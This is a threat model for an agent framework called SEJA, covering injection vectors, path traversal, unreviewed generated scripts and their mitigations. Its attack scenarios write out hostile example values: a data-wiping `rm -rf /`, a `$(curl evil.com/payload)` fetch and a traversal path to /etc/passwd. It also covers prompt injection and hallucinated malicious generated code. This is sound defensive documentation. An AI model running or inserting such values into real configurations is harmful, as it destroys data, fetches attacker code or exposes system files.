# SEJA Framework Threat Model

Lightweight threat model for the SEJA agent framework. Uses STRIDE-lite categories where applicable.

## Trust Boundaries

| Boundary | Inside (trusted) | Outside (untrusted) |
|---|---|---|
| B1 -- Conventions file | Framework code | User-authored `conventions.md` values |
| B2 -- Generated scripts | Reviewed & committed scripts | Freshly generated script output |
| B3 -- Agent subprompts | Skill SKILL.md definitions | Runtime user arguments |
| B4 -- File system | REPO_ROOT subtree | Paths outside REPO_ROOT |
| B5 -- Shell execution | Python subprocess calls with fixed args | Interpolated or user-supplied commands |

## Injection Vectors

| Vector | STRIDE | Severity | Likelihood | Mitigation | Status |
|---|---|---|---|---|---|
| V1 -- Shell metacharacters in conventions values | Tampering | High | Low | `_SHELL_INJECTION_RE` rejects backticks, `$(`, `$((` | Enforced |
| V2 -- Circular/missing `${VAR}` references | Denial of Service | Low | Medium | `_MAX_RESOLVE_PASSES=10` cap; post-resolve warning | Enforced |
| V3 -- Path traversal via `get_path()` | Information Disclosure | Medium | Low | `resolve()` + `relative_to(REPO_ROOT)` containment check | Enforced |
| V4 -- Unreviewed generated scripts | Elevation of Privilege | High | Medium | `/generate-script` mandatory user confirmation before write | Enforced |
| V5 -- Prompt injection via user arguments | Spoofing | Medium | Medium | Skills receive arguments through structured frontmatter; no direct shell pass-through | Partial |
| V6 -- Malicious conventions.md in cloned repo | Tampering | Medium | Low | Shell-injection and path-traversal guards in `project_config.py` | Enforced |

## Attack Scenarios

### S1 -- Poisoned conventions.md (V1, V6)

An attacker contributes a conventions.md containing a value like `` `rm -rf /` `` or `$(curl evil.com/payload)`. When a helper script calls `get()` and interpolates the result into a shell command, the payload executes.

**Mitigation**: `_SHELL_INJECTION_RE` drops any value containing backticks, `$(`, or `$((` at parse time, before the value enters the resolved config dict.

### S2 -- Path escape (V3)

A conventions variable is set to `../../../etc/passwd`. A script using `get_path()` would resolve it outside REPO_ROOT, potentially reading or writing sensitive files.

**Mitigation**: `get_path()` resolves the candidate path and verifies it is contained within `REPO_ROOT` using `Path.relative_to()`. Non-contained paths return `None` with a stderr warning.

### S3 -- Unreviewed script execution (V4)

`/generate-script` produces a Python file. If the user runs it without review, a hallucinated or malicious code path could damage the project.

**Mitigation**: The skill includes a mandatory confirmation gate -- the full script is displayed to the user, who must approve before the file is written to disk.

### S4 -- Variable resolution bomb (V2)

Circular references like `A=${B}`, `B=${A}` cause the resolver to loop. With no cap, this would hang the process.

**Mitigation**: `_MAX_RESOLVE_PASSES=10` ensures termination. Unresolved references after exhaustion trigger a warning.

## Current Mitigations Summary

| Component | Guard | Added |
|---|---|---|
| `project_config._parse_config()` | Shell-injection regex filter | plan-000117 |
| `project_config._parse_config()` | Unresolved-var warning after max passes | plan-000117 |
| `project_config.get_path()` | Path containment within REPO_ROOT | plan-000117 |
| `/generate-script` SKILL.md | Mandatory user confirmation before write | plan-000117 |
| `_MAX_RESOLVE_PASSES` | Iteration cap (10) for variable resolution | Original |

## Recommended Future Hardening

1. **Allowlist for conventions values**: Instead of blocklisting shell metacharacters, define an allowlist regex (alphanumeric, hyphens, slashes, dots, commas) for convention values.
2. **Content Security Policy for generated scripts**: Lint generated scripts for dangerous imports (`os.system`, `subprocess.Popen` with `shell=True`) before presenting to the user.
3. **Subagent argument sanitization**: Add a shared sanitization step in `/pre-skill` that validates user arguments against type-specific patterns.
4. **Audit logging**: Log all rejected values and path escapes to a persistent audit file for post-incident analysis.
